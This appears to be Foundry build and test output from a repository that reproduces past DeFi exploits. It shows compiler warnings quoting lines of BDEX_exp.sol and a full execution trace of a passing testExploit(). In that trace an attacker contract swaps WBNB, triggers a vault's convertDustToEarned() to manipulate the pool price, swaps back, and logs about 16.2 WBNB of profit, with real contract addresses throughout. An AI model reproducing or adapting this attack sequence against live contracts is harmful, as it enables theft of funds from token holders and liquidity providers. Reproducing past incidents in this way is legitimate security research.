Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.14s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2022-11/BDEX_exp.sol:23:5:
   |
23 |     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:2080:1:
     |
2080 | interface WBNB {
     | ^ (Relevant source part starts here and spans across multiple lines).

Warning (9302): Return value of low-level calls not used.
  --> src/test/2022-11/BDEX_exp.sol:36:9:
   |
36 |         address(WBNB).call{value: 34 ether}("");
   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Warning (9302): Return value of low-level calls not used.
  --> src/test/2022-11/BDEX_exp.sol:48:9:
   |
48 |         address(WBNB).call(abi.encodeWithSignature("withdraw(uint256)", 34 * 1e18));
   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 303.81ms (289.28µs CPU time)

Ran 1 test for src/test/2022-11/BDEX_exp.sol:ContractTest
[PASS] testExploit() (gas: 321938)
Logs:
  [End] Attacker WBNB balance after exploit: 16.219023434405118803

Traces:
  [394538] ContractTest::testExploit()
    ├─ [23731] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::fallback{value: 34000000000000000000}()
    │   ├─ emit Deposit(dst: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 34000000000000000000 [3.4e19])
    │   └─ ← [Stop] 
    ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 34000000000000000000 [3.4e19]
    ├─ [8062] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D, 34000000000000000000 [3.4e19])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D, value: 34000000000000000000 [3.4e19])
    │   └─ ← [Return] true
    ├─ [2504] 0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D::getReserves() [staticcall]
    │   └─ ← [Return] 23801780384714259372163 [2.38e22], 23379814044202330489 [2.337e19], 1666920996 [1.666e9]
    ├─ [131435] 0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D::swap(14092068546132948747119 [1.409e22], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   ├─ [86387] 0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 14092068546132948747119 [1.409e22])
    │   │   ├─ [79187] 0x319A1Fc65775020dE5D996c9A6A16d5401439E88::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 14092068546132948747119 [1.409e22]) [delegatecall]
    │   │   │   ├─ emit Transfer(from: 0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 14092068546132948747119 [1.409e22])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   ├─ [2993] 0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867::balanceOf(0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D) [staticcall]
    │   │   ├─ [2296] 0x319A1Fc65775020dE5D996c9A6A16d5401439E88::balanceOf(0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D) [delegatecall]
    │   │   │   └─ ← [Return] 9709711838581310625044 [9.709e21]
    │   │   └─ ← [Return] 9709711838581310625044 [9.709e21]
    │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D) [staticcall]
    │   │   └─ ← [Return] 57379814044202330489 [5.737e19]
    │   ├─ emit Sync(reserve0: 9709711838581310625044 [9.709e21], reserve1: 57379814044202330489 [5.737e19])
    │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 0, amount1In: 34000000000000000000 [3.4e19], amount0Out: 14092068546132948747119 [1.409e22], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← [Stop] 
    ├─ [119555] 0xB2B1DC3204ee8899d6575F419e72B53E370F6B20::convertDustToEarned()
    │   ├─ [6993] 0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867::balanceOf(0xB2B1DC3204ee8899d6575F419e72B53E370F6B20) [staticcall]
    │   │   ├─ [6296] 0x319A1Fc65775020dE5D996c9A6A16d5401439E88::balanceOf(0xB2B1DC3204ee8899d6575F419e72B53E370F6B20) [delegatecall]
    │   │   │   └─ ← [Return] 105959281573910400 [1.059e17]
    │   │   └─ ← [Return] 105959281573910400 [1.059e17]
    │   ├─ [2534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xB2B1DC3204ee8899d6575F419e72B53E370F6B20) [staticcall]
    │   │   └─ ← [Return] 18924462198662965022 [1.892e19]
    │   ├─ [2717] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::allowance(0xB2B1DC3204ee8899d6575F419e72B53E370F6B20, 0xC6747954a9B3A074d8E4168B444d7F397FeE76AA) [staticcall]
    │   │   └─ ← [Return] 162360459439061475742 [1.623e20]
    │   ├─ [5220] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::approve(0xC6747954a9B3A074d8E4168B444d7F397FeE76AA, 181284921637724440764 [1.812e20])
    │   │   ├─ emit Approval(owner: 0xB2B1DC3204ee8899d6575F419e72B53E370F6B20, spender: 0xC6747954a9B3A074d8E4168B444d7F397FeE76AA, value: 181284921637724440764 [1.812e20])
    │   │   └─ ← [Return] true
    │   ├─ [79391] 0xC6747954a9B3A074d8E4168B444d7F397FeE76AA::swapExactTokensForTokens(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867, 18924462198662965022 [1.892e19], 1, [0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D], 0xB2B1DC3204ee8899d6575F419e72B53E370F6B20, 1667153919 [1.667e9])
    │   │   ├─ [17088] 0xCB9f345c32e2216e5F13E1A816059C6435C92038::getFactoryAmountsOut(0x2C358A7C62cdb9D554A65A86EEa034bc55D1E715, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867, 18924462198662965022 [1.892e19], [0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D]) [staticcall]
    │   │   │   ├─ [405] 0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D::token0() [staticcall]
    │   │   │   │   └─ ← [Return] 0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867
    │   │   │   ├─ [504] 0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 9709711838581310625044 [9.709e21], 57379814044202330489 [5.737e19], 1667152119 [1.667e9]
    │   │   │   ├─ [9907] 0x2C358A7C62cdb9D554A65A86EEa034bc55D1E715::getWeightsAndSwapFee(0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D) [staticcall]
    │   │   │   │   ├─ [2630] 0x50A76ACc2838CA53488F51FDc5306C27168A57F3::getWeightsAndSwapFee(0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000003200000000000000000000000000000000000000000000000000000000000000320000000000000000000000000000000000000000000000000000000000000014
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000003200000000000000000000000000000000000000000000000000000000000000320000000000000000000000000000000000000000000000000000000000000014
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000106a1321a849d271e000000000000000000000000000000000000000000000082595033ae6c5da4cd
    │   │   ├─ [6948] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transferFrom(0xB2B1DC3204ee8899d6575F419e72B53E370F6B20, 0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D, 18924462198662965022 [1.892e19])
    │   │   │   ├─ emit Transfer(from: 0xB2B1DC3204ee8899d6575F419e72B53E370F6B20, to: 0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D, value: 18924462198662965022 [1.892e19])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [405] 0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D::token0() [staticcall]
    │   │   │   └─ ← [Return] 0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867
    │   │   ├─ [40266] 0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D::swap(2404512430273989551309 [2.404e21], 0, 0xB2B1DC3204ee8899d6575F419e72B53E370F6B20, 0x)
    │   │   │   ├─ [23787] 0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867::transfer(0xB2B1DC3204ee8899d6575F419e72B53E370F6B20, 2404512430273989551309 [2.404e21])
    │   │   │   │   ├─ [23087] 0x319A1Fc65775020dE5D996c9A6A16d5401439E88::transfer(0xB2B1DC3204ee8899d6575F419e72B53E370F6B20, 2404512430273989551309 [2.404e21]) [delegatecall]
    │   │   │   │   │   ├─ emit Transfer(from: 0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D, to: 0xB2B1DC3204ee8899d6575F419e72B53E370F6B20, value: 2404512430273989551309 [2.404e21])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [2993] 0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867::balanceOf(0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D) [staticcall]
    │   │   │   │   ├─ [2296] 0x319A1Fc65775020dE5D996c9A6A16d5401439E88::balanceOf(0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 7305199408307321073735 [7.305e21]
    │   │   │   │   └─ ← [Return] 7305199408307321073735 [7.305e21]
    │   │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D) [staticcall]
    │   │   │   │   └─ ← [Return] 76304276242865295511 [7.63e19]
    │   │   │   ├─ emit Sync(reserve0: 7305199408307321073735 [7.305e21], reserve1: 76304276242865295511 [7.63e19])
    │   │   │   ├─ emit Swap(sender: 0xC6747954a9B3A074d8E4168B444d7F397FeE76AA, amount0In: 0, amount1In: 18924462198662965022 [1.892e19], amount0Out: 2404512430273989551309 [2.404e21], amount1Out: 0, to: 0xB2B1DC3204ee8899d6575F419e72B53E370F6B20)
    │   │   │   └─ ← [Stop] 
    │   │   ├─ emit Exchange(: 0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D, : 2404512430273989551309 [2.404e21], : 0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867)
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000106a1321a849d271e000000000000000000000000000000000000000000000082595033ae6c5da4cd
    │   └─ ← [Stop] 
    ├─ [2993] 0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [2296] 0x319A1Fc65775020dE5D996c9A6A16d5401439E88::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 14092068546132948747119 [1.409e22]
    │   └─ ← [Return] 14092068546132948747119 [1.409e22]
    ├─ [23173] 0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867::transfer(0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D, 14092068546132948747119 [1.409e22])
    │   ├─ [22473] 0x319A1Fc65775020dE5D996c9A6A16d5401439E88::transfer(0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D, 14092068546132948747119 [1.409e22]) [delegatecall]
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D, value: 14092068546132948747119 [1.409e22])
    │   │   └─ ← [Return] true
    │   └─ ← [Return] true
    ├─ [504] 0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D::getReserves() [staticcall]
    │   └─ ← [Return] 7305199408307321073735 [7.305e21], 76304276242865295511 [7.63e19], 1667152119 [1.667e9]
    ├─ [39564] 0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D::swap(0, 50219023434405118803 [5.021e19], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   ├─ [23162] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 50219023434405118803 [5.021e19])
    │   │   ├─ emit Transfer(from: 0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 50219023434405118803 [5.021e19])
    │   │   └─ ← [Return] true
    │   ├─ [2993] 0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867::balanceOf(0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D) [staticcall]
    │   │   ├─ [2296] 0x319A1Fc65775020dE5D996c9A6A16d5401439E88::balanceOf(0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D) [delegatecall]
    │   │   │   └─ ← [Return] 21397267954440269820854 [2.139e22]
    │   │   └─ ← [Return] 21397267954440269820854 [2.139e22]
    │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D) [staticcall]
    │   │   └─ ← [Return] 26085252808460176708 [2.608e19]
    │   ├─ emit Sync(reserve0: 21397267954440269820854 [2.139e22], reserve1: 26085252808460176708 [2.608e19])
    │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 14092068546132948747119 [1.409e22], amount1In: 0, amount0Out: 0, amount1Out: 50219023434405118803 [5.021e19], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← [Stop] 
    ├─ [9195] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::withdraw(34000000000000000000 [3.4e19])
    │   ├─ [55] ContractTest::receive{value: 34000000000000000000}()
    │   │   └─ ← [Stop] 
    │   ├─ emit Withdrawal(src: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 34000000000000000000 [3.4e19])
    │   └─ ← [Stop] 
    ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 16219023434405118803 [1.621e19]
    ├─ emit log_named_decimal_uint(key: "[End] Attacker WBNB balance after exploit", val: 16219023434405118803 [1.621e19], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 326.70ms (4.40ms CPU time)

Ran 2 test suites in 327.90ms (630.51ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
